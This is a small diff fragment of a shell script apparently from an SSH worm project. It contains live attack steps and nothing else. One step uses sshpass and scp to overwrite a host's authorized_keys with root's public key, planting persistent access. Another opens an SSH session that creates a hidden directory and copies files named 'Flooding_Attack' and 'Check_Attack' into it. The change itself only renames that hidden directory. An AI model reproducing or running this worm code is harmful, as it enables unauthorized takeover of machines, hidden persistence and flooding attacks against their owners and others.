@@ -34,7 +34,7 @@ sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
 sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys
 #####
 
-ssh victim@"$IP_Address" 'Hidden1="/home/victim/.etc/.gitignore";
+ssh victim@"$IP_Address" 'Hidden1="/home/victim/.etc/.qq";
 			mkdir -p $Hidden1;
 			cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack $Hidden1;
 			cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden1;
